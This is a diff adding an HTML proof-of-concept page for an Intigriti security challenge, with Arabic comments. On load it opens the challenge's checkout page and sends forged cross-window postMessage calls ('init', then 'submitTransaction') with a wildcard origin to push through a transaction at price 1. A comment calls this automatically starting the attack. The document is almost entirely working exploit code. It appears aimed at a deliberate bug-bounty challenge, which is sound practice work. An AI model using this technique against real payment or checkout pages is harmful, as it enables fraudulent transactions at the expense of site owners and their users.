@@ -1,1 +1,83 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PoC - Intigriti Challenge</title>
+</head>
+<body>
+    <script>
+        const challengeUrl = 'https://challenge-0126.intigriti.io';
+        
+        // ✅ **تغيير مهم**: العملة يجب أن تكون `1337coin` (بأحرف صغيرة)
+        // لأن السيرفر يتوقع هذا الاسم
+        const currency = '1337coin';  
+        const amount = 1;
 
+        // ✅ **تصحيح**: فتح الصفحة ثم الانتظار حتى تحمل
+        function openCheckout() {
+            // 1. فتح checkout.html بالعملة والسعر الصحيح
+            const checkoutWindow = window.open(
+                challengeUrl + '/checkout.html?currency=' + currency + '&price=1',
+                '_blank'
+            );
+            
+            if (!checkoutWindow) {
+                console.error('❌ تم حجب النافذة المنبثقة');
+                return;
+            }
+            
+            console.log('✅ فتحت checkout.html');
+            
+            // 2. بعد تحميل الصفحة، أرسل init أولاً
+            setTimeout(() => {
+                try {
+                    // أرسل رسالة init لتجهيز transactionData
+                    checkoutWindow.postMessage({
+                        type: 'init',
+                        currency: currency,
+                        amount: amount,
+                        price: 1
+                    }, '*');
+                    
+                    console.log('📤 أرسلت رسالة init');
+                    
+                    // 3. بعد init، انتظر قليلاً ثم أرسل submitTransaction
+                    setTimeout(() => {
+                        // ✅ **تغيير مهم**: أرسل الرسالة الصحيحة
+                        checkoutWindow.postMessage({
+                            type: 'submitTransaction',
+                            transaction: {
+                                currency: currency,
+                                amount: amount,
+                                toAddress: 'anything_here' // غير مهم حقاً
+                            }
+                        }, '*');
+                        
+                        console.log('📤 أرسلت رسالة submitTransaction');
+                    }, 2000);
+                    
+                } catch (error) {
+                    console.error('❌ خطأ في إرسال الرسالة:', error);
+                }
+            }, 3000);
+        }
+
+        // ✅ **تغيير**: استمع للرسائل المرتجعة للتصحيح
+        window.addEventListener('message', function(event) {
+            console.log('📩 رسالة مستلمة من checkout:', event.data);
+            
+            // يمكنك تسجيل الرسائل للتحقق مما يحدث
+            if (event.data && event.data.type) {
+                console.log('نوع الرسالة:', event.data.type);
+            }
+        });
+
+        // ✅ **بدء الهجوم تلقائياً**
+        window.onload = function() {
+            console.log('🚀 بدء الهجوم تلقائياً...');
+            openCheckout();
+        };
+    </script>
+</body>
+</html>
